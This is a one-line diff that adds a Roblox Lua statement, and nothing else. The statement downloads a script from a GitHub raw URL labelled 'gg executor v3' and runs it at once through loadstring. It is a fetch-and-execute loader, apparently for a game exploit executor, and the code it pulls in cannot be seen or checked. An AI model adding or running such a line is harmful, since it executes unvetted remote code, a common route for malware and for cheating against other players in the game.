@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aleksandre070716-cell/gg-executor-v3/refs/heads/main/gg%20executor%20v3"))()
